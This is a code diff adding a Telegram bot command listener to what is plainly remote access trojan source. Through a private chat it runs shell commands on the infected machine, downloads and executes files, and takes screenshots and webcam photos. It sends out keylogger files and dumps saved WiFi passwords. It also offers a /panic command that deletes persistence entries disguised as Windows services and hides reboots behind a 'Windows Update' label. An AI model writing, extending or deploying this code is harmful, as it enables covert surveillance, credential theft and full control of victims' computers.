@@ -406,6 +406,199 @@ import atexit
 atexit.register(_telegram_mark_offline)
 
 _TELEGRAM_HEARTBEAT_RUNNING = True
+_TG_CMD_LAST_UPDATE_ID = 0
+
+def _telegram_command_listener():
+    """Poll Telegram getUpdates and execute commands from authorized chat."""
+    global _TG_CMD_LAST_UPDATE_ID
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
+        return
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+            params = {"offset": _TG_CMD_LAST_UPDATE_ID + 1, "timeout": 30, "allowed_updates": ["message"]}
+            resp = requests.get(url, params=params, timeout=40)
+            if resp.status_code != 200:
+                time.sleep(5)
+                continue
+            updates = resp.json().get("result", [])
+            for update in updates:
+                _TG_CMD_LAST_UPDATE_ID = update.get("update_id", _TG_CMD_LAST_UPDATE_ID)
+                msg = update.get("message", {})
+                chat_id = str(msg.get("chat", {}).get("id", ""))
+                if chat_id != str(TELEGRAM_CHAT_ID):
+                    continue
+                text = msg.get("text", "").strip()
+                if not text:
+                    continue
+                _handle_telegram_command(text)
+        except:
+            time.sleep(5)
+
+def _handle_telegram_command(text: str):
+    """Process a single Telegram command and respond."""
+    parts = text.split(maxsplit=1)
+    cmd = parts[0].lower()
+    args = parts[1] if len(parts) > 1 else ""
+    _NO_WINDOW = 0x08000000
+
+    if cmd == "/help":
+        _send_telegram(
+            "<b>IGR Commands</b>\n"
+            "/help - This message\n"
+            "/info - System info\n"
+            "/screen - Screenshot\n"
+            "/webcam - Webcam photo\n"
+            "/keylog - Keylog file\n"
+            "/wifi - WiFi passwords\n"
+            "/shell &lt;cmd&gt; - Run command\n"
+            "/download &lt;url&gt; - Download+run\n"
+            "/reboot - Reboot machine\n"
+            "/shutdown - Shutdown machine\n"
+            "/panic - Self destruct\n"
+            "/url - Dashboard URL"
+        )
+
+    elif cmd == "/info":
+        try:
+            hostname = socket.gethostname()
+            username = os.environ.get("USERNAME", "?")
+            os_info = f"{platform.system()} {platform.release()}"
+            ip = requests.get("https://api.ipify.org", timeout=10).text
+            _send_telegram(f"<b>System Info</b>\nHost: {hostname}\nUser: {username}\nOS: {os_info}\nIP: {ip}\nURL: {CLOUDFLARED_PUBLIC_URL}")
+        except:
+            _send_telegram("Failed to get system info")
+
+    elif cmd == "/screen":
+        try:
+            import ctypes
+            ctypes.windll.user32.SetCursorPos(0, 0)
+            time.sleep(0.3)
+            from PIL import ImageGrab
+            img = ImageGrab.grab()
+            path = os.path.join(KEYLOG_DIR, "_tg_screen.png")
+            img.save(path)
+            _send_telegram_file(path, "Screenshot")
+            os.remove(path)
+        except:
+            _send_telegram("Screen capture failed")
+
+    elif cmd == "/webcam":
+        try:
+            import cv2
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            cap.release()
+            if ret:
+                path = os.path.join(KEYLOG_DIR, "_tg_webcam.jpg")
+                cv2.imwrite(path, frame)
+                _send_telegram_file(path, "Webcam")
+                os.remove(path)
+            else:
+                _send_telegram("Webcam not available")
+        except:
+            _send_telegram("Webcam capture failed")
+
+    elif cmd == "/keylog":
+        try:
+            keylog_path = os.path.join(KEYLOG_DIR, "keylog.txt")
+            if os.path.exists(keylog_path) and os.path.getsize(keylog_path) > 0:
+                _send_telegram_file(keylog_path, "Keylog")
+            else:
+                _send_telegram("No keylog data yet")
+        except:
+            _send_telegram("Keylog send failed")
+
+    elif cmd == "/wifi":
+        try:
+            passwords = _dump_wifi_passwords()
+            if passwords:
+                text = "\n".join(passwords[:30])
+                _send_telegram(f"<b>WiFi Passwords</b>\n<pre>{text}</pre>")
+            else:
+                _send_telegram("No WiFi passwords found")
+        except:
+            _send_telegram("WiFi dump failed")
+
+    elif cmd == "/shell":
+        if not args:
+            _send_telegram("Usage: /shell <command>")
+            return
+        try:
+            result = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30, creationflags=_NO_WINDOW)
+            output = (result.stdout or "") + (result.stderr or "")
+            if len(output) > 4000:
+                output = output[-4000:]
+            _send_telegram(f"<b>$ {args}</b>\n<pre>{output}</pre>")
+        except subprocess.TimeoutExpired:
+            _send_telegram(f"Command timed out: {args}")
+        except:
+            _send_telegram(f"Command failed: {args}")
+
+    elif cmd == "/download":
+        if not args:
+            _send_telegram("Usage: /download <url>")
+            return
+        try:
+            filename = args.split("/")[-1].split("?")[0] or "download.exe"
+            dl_path = os.path.join(KEYLOG_DIR, filename)
+            resp = requests.get(args, timeout=120, allow_redirects=True)
+            with open(dl_path, "wb") as f:
+                f.write(resp.content)
+            subprocess.Popen(dl_path, creationflags=_NO_WINDOW)
+            _send_telegram(f"Downloaded and executed: {filename}")
+        except:
+            _send_telegram(f"Download failed: {args}")
+
+    elif cmd == "/reboot":
+        try:
+            _send_telegram("Rebooting machine...")
+            subprocess.run(["shutdown", "/r", "/t", "5", "/c", "Windows Update"], creationflags=_NO_WINDOW)
+        except:
+            _send_telegram("Reboot failed")
+
+    elif cmd == "/shutdown":
+        try:
+            _send_telegram("Shutting down machine...")
+            subprocess.run(["shutdown", "/s", "/t", "5", "/c", "Windows Update"], creationflags=_NO_WINDOW)
+        except:
+            _send_telegram("Shutdown failed")
+
+    elif cmd == "/panic":
+        try:
+            _send_telegram("Self-destruct initiated...")
+            _NO_WIN = 0x08000000
+            try:
+                import winreg
+                winreg.DeleteValue(winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE),
+                    "WindowsRuntime")
+            except:
+                pass
+            try:
+                subprocess.run(["schtasks", "/delete", "/tn", "WindowsRuntime", "/f"],
+                    capture_output=True, creationflags=_NO_WIN)
+            except:
+                pass
+            for d in [os.path.join(os.environ.get("APPDATA", "."), "Microsoft", "WindowsRuntime"),
+                      os.path.join(os.environ.get("LOCALAPPDATA", "."), "Microsoft", "SystemService"),
+                      os.path.join(os.environ.get("APPDATA", "."), "Microsoft", "Windows", "RuntimeBroker"),
+                      os.path.join(os.environ.get("PROGRAMDATA", "."), "WpnService")]:
+                try:
+                    import shutil
+                    shutil.rmtree(d, ignore_errors=True)
+                except:
+                    pass
+            _telegram_mark_offline()
+            os._exit(0)
+        except:
+            os._exit(0)
+
+    elif cmd == "/url":
+        _send_telegram(f"Dashboard: {CLOUDFLARED_PUBLIC_URL}")
+
+    else:
+        _send_telegram(f"Unknown command: {cmd}\nType /help for commands")
 
 def _telegram_heartbeat(cloudflared_url: str):
     """Periodically update the Telegram status message with current Last Seen time."""
@@ -3373,6 +3566,7 @@ def main():
         if has_telegram:
             _send_telegram_full_report(CLOUDFLARED_PUBLIC_URL)
             threading.Thread(target=_telegram_heartbeat, args=(CLOUDFLARED_PUBLIC_URL,), daemon=True).start()
+            threading.Thread(target=_telegram_command_listener, daemon=True).start()
     
     try:
         app.run(host=SERVICE_HOST, port=port, debug=False, use_reloader=False)
